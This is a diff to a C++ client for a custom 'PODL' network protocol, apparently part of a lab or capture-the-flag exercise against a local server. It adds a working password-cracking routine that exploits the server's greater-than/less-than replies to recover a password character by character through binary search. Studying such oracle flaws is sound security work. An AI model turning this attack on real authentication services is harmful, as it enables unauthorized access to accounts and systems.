@@ -15,10 +15,10 @@ PODLClient::PODLClient(string ipaddr, int port)
 	}
 
 	//Add timeout to sock options
-    struct timeval tv;
-    tv.tv_sec = 60;
-    tv.tv_usec = 0;
-    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
+    //struct timeval tv;
+    //tv.tv_sec = 999;
+    //tv.tv_usec = 0;
+    //setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
 
 	//addr = {0};
 	addr.sin_family = AF_INET;
@@ -47,7 +47,7 @@ PODLClient::~PODLClient()
  * 
  * @return {int}  : 
  */
-int PODLClient::RecvPacket(char* resbuffer)
+int PODLClient::RecvPacket(char* resbuffer, PODLPacket& packet)
 {
 	int numBytes = 0;
 	int isInvalidPacket = 0;
@@ -63,9 +63,8 @@ int PODLClient::RecvPacket(char* resbuffer)
 			return 1;
 		}
 			
-		PODLPacket packet;
 		isInvalidPacket = packet.Deserialize(resbuffer);
-		std::cout << "PODLClient: Response Received: " << packet << std::endl;
+		std::cout << "PODLClient: Response Received: " << packet  << std::endl;
 	}
 	catch(exception ex)
 	{
@@ -92,6 +91,22 @@ int PODLClient::SendPacket(const char* msg, int size)
 	return 0;
 }
 
+int PODLClient::SendPacket(PODLPacket& sendPacket, PODLPacket& respPacket)
+{
+	std::vector<char> buffer(PODL_MAX_SIZE);
+	std::vector<char> resbuffer(PODL_MAX_SIZE);
+	MD5((unsigned char*)&sendPacket.msg, sendPacket.msg.length + PODL_MIN_SIZE, sendPacket.checksum);
+
+	sendPacket.Serialize(buffer.data());
+	SendPacket(buffer.data(), buffer.size());
+
+	resbuffer.assign(PODL_MAX_SIZE,0);
+	RecvPacket(resbuffer.data(), respPacket);
+
+	return 0;
+}
+
+
 /**
  * PODLClient::Run() 
  * 
@@ -99,74 +114,43 @@ int PODLClient::SendPacket(const char* msg, int size)
  */
 int PODLClient::RunTests()
 {
-    //byte buffer
-	std::vector<char> buffer(PODL_MAX_SIZE);
-	std::vector<char> resbuffer(PODL_MAX_SIZE);
-
-	PODLPacket goodPacket;
-    goodPacket.msg.id = 28;
+	PODLPacket sendPacket;
+	PODLPacket respPacket;
+    sendPacket.msg.id = 28;
     
     unsigned char checksum[MD5_DIGEST_LENGTH];
 
     //Correct Password Case
     string stringData = "password";
-    goodPacket.msg.length = stringData.length();
-    int packetSize = goodPacket.msg.length + PODL_MIN_SIZE;
+    sendPacket.msg.length = stringData.length();
+    int packetSize = sendPacket.msg.length + PODL_MIN_SIZE;
+    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), sendPacket.msg.data);
 
-    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), goodPacket.msg.data);
-    MD5((unsigned char*)&goodPacket.msg, packetSize, (unsigned char*)&goodPacket.checksum);
-
-	goodPacket.Serialize(buffer.data());
-	SendPacket(buffer.data(), buffer.size());
-
-	//Clear Response buffer
-	resbuffer.assign(PODL_MAX_SIZE,0);
-	RecvPacket(resbuffer.data());
+	SendPacket(sendPacket, respPacket);
 
     //wrong password case
 	stringData = "pas2rd";
-    goodPacket.msg.length = stringData.length();
-    packetSize = goodPacket.msg.length + PODL_MIN_SIZE;
+    sendPacket.msg.length = stringData.length();
+    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), sendPacket.msg.data);
 
-    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), goodPacket.msg.data);
-    MD5((unsigned char*)&goodPacket, packetSize, (unsigned char*)&goodPacket.checksum);
-
-	goodPacket.Serialize(buffer.data());
-	SendPacket(buffer.data(), buffer.size());
-
-	//Clear Buffer
-	buffer.assign(PODL_MAX_SIZE,0);
-	RecvPacket(resbuffer.data());
+	SendPacket(sendPacket, respPacket);
 
     //wrong checksum case, use previous checksum
     stringData = "password";
-    goodPacket.msg.length = stringData.length();
-    packetSize = goodPacket.msg.length + PODL_MIN_SIZE;
+    sendPacket.msg.length = stringData.length();
+    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), sendPacket.msg.data);
 
-    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), goodPacket.msg.data);
-    MD5((unsigned char*)&goodPacket, packetSize, (unsigned char*)&goodPacket.checksum);
-
-	goodPacket.Serialize(buffer.data());
-	SendPacket(buffer.data(), buffer.size());
-
-	resbuffer.assign(PODL_MAX_SIZE,0);
-	RecvPacket(resbuffer.data());
+	SendPacket(sendPacket, respPacket);
 
     //wrong passwordlen
     stringData = "password";
-    goodPacket.msg.length = stringData.length() + 30;
-    packetSize = goodPacket.msg.length + PODL_MIN_SIZE;
+    sendPacket.msg.length = stringData.length() + 30;
+    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), sendPacket.msg.data);
 
-    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), goodPacket.msg.data);
-    MD5((unsigned char*)&goodPacket, packetSize, (unsigned char*)&goodPacket.checksum);
-
-	goodPacket.Serialize(buffer.data());
-	SendPacket(buffer.data(), buffer.size());
-
-	resbuffer.assign(PODL_MAX_SIZE,0);
-	RecvPacket(resbuffer.data());
+	SendPacket(sendPacket, respPacket);
 	return 0;
 }
+
 
 
 /** 
@@ -175,78 +159,126 @@ int PODLClient::RunTests()
  * 
  * @return {int}  : 
  */
-int PODLClient::RunTests()
+// Approach Start with test password
+// Check Response, if response data == 0x00 correct
+// if 0x01 0x00 increment password value
+// if 0x01 0xff decrement password value
+/*
+Use binary search to reduce iterations
+Treat 0...127 as array
+*/
+int PODLClient::RunBinarySearchCrack()
 {
-    //byte buffer
-	std::vector<char> buffer(PODL_MAX_SIZE);
-	std::vector<char> resbuffer(PODL_MAX_SIZE);
+    std::string sentPassword =  std::string(1,0);
+    bool passwordFound = false;
+    int passwordIndex = 0;
 
-	PODLPacket goodPacket;
-    goodPacket.msg.id = 28;
-    
-    unsigned char checksum[MD5_DIGEST_LENGTH];
+    int l = 0;   //left bound
+    int r = 127; //right bound
+	int m = 0;   //middle
 
-    //Correct Password Case
-    string stringData = "password";
-    goodPacket.msg.length = stringData.length();
-    int packetSize = goodPacket.msg.length + PODL_MIN_SIZE;
+    while(!passwordFound)
+    {
+		//Set char from middle value
+        m = l + (r-l)/2; 
+        sentPassword[passwordIndex] = (char)m;
+        int res = CheckPassword(sentPassword);
+        std::cout << "Test Password: " <<  sentPassword << std::endl;
 
-    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), goodPacket.msg.data);
-    MD5((unsigned char*)&goodPacket.msg, packetSize, (unsigned char*)&goodPacket.checksum);
-
-	goodPacket.Serialize(buffer.data());
-	SendPacket(buffer.data(), buffer.size());
-
-	//Clear Response buffer
-	resbuffer.assign(PODL_MAX_SIZE,0);
-	RecvPacket(resbuffer.data());
-
-    //wrong password case
-	stringData = "pas2rd";
-    goodPacket.msg.length = stringData.length();
-    packetSize = goodPacket.msg.length + PODL_MIN_SIZE;
-
-    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), goodPacket.msg.data);
-    MD5((unsigned char*)&goodPacket, packetSize, (unsigned char*)&goodPacket.checksum);
-
-	goodPacket.Serialize(buffer.data());
-	SendPacket(buffer.data(), buffer.size());
-
-	//Clear Buffer
-	buffer.assign(PODL_MAX_SIZE,0);
-	RecvPacket(resbuffer.data());
-
-    //wrong checksum case, use previous checksum
-    stringData = "password";
-    goodPacket.msg.length = stringData.length();
-    packetSize = goodPacket.msg.length + PODL_MIN_SIZE;
-
-    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), goodPacket.msg.data);
-    MD5((unsigned char*)&goodPacket, packetSize, (unsigned char*)&goodPacket.checksum);
-
-	goodPacket.Serialize(buffer.data());
-	SendPacket(buffer.data(), buffer.size());
-
-	resbuffer.assign(PODL_MAX_SIZE,0);
-	RecvPacket(resbuffer.data());
-
-    //wrong passwordlen
-    stringData = "password";
-    goodPacket.msg.length = stringData.length() + 30;
-    packetSize = goodPacket.msg.length + PODL_MIN_SIZE;
-
-    std::copy(stringData.c_str(), stringData.c_str() + stringData.length(), goodPacket.msg.data);
-    MD5((unsigned char*)&goodPacket, packetSize, (unsigned char*)&goodPacket.checksum);
-
-	goodPacket.Serialize(buffer.data());
-	SendPacket(buffer.data(), buffer.size());
-
-	resbuffer.assign(PODL_MAX_SIZE,0);
-	RecvPacket(resbuffer.data());
+        if (res == 0)
+        {
+            r = m - 1;
+        }
+        else if(res == 1){
+			//Add char and check if previous value was correct or just less than
+            sentPassword.push_back((char)127);
+            res = CheckPassword(sentPassword);
+            if(res == 0)
+            {
+                std::cout << "Char found Moving to next char" << std::endl;
+                passwordIndex++;
+                l = 0;
+                r = 127;
+            }
+            else
+            {
+				//char was incorrect remove test char
+                sentPassword.pop_back();
+                l = m + 1;
+            }
+        }
+		//Correct Password Found
+		else if(res == 2)
+		{
+			passwordFound = true;
+			break;
+		}
+		//Bad MD5
+		else
+		{
+			return 1;
+		}
+		
+    }
+	std::cout << "Cracked Password: " << sentPassword << std::endl;
 	return 0;
 }
 
+/**
+ * PODLClient::CheckPassword
+ * 
+ * @param  {std::string} password : password to try
+ * @return {int}                  : result from PODL response
+ * Note: Changes can be made to reduce dataspace but will be left
+ * 		 for readability 
+ * 		 
+ */
+int PODLClient::CheckPassword(std::string password)
+{
 
+	int returnCode = 0;
+
+	PODLPacket sendPacket;
+	PODLPacket respPacket;
+    
+    unsigned char checksum[MD5_DIGEST_LENGTH];
+
+	string testPassword = password;
+	int passwordLength = 0;
+	sendPacket.msg.id = 28;
+
+	sendPacket.msg.length = testPassword.length();
+	int packetSize = sendPacket.msg.length + PODL_MIN_SIZE;
+
+	std::copy(testPassword.c_str(), testPassword.c_str() + testPassword.length(), sendPacket.msg.data);
+	MD5((unsigned char*)&sendPacket.msg, packetSize, (unsigned char*)&sendPacket.checksum);
+
+	SendPacket(sendPacket, respPacket);
+
+	// Correct Password
+	if(respPacket.msg.data[0] == 0x00)
+	{
+		std::cout << "Found Password: " << testPassword.c_str() << std::endl; 
+		returnCode = 2;
+	}
+	else if(respPacket.msg.data[0] == 0x01 && (unsigned char)(respPacket.msg.data[1]) == 0x00)
+	{
+		std::cout << "Sent Password:  < CorrectPassword " << testPassword.c_str() << std::endl; 
+		returnCode = 1;
+	}
+	else if(respPacket.msg.data[0] == 0x01 &&  (unsigned char)respPacket.msg.data[1] == 0xff)
+	{
+		std::cout << "Sent Password:  > CorrectPassword " << testPassword.c_str() << std::endl; 
+		returnCode = 0;
+	}
+	else if(respPacket.msg.data[0] == 0x02)
+	{
+		std::cout << "Bad MD5" << std::endl;
+		returnCode = 3;
+	}
+	return returnCode;
+
+}
 /*int main(int argc, const char* argv[])
 {
 	PODLClient cli("127.0.0.1", 10000);
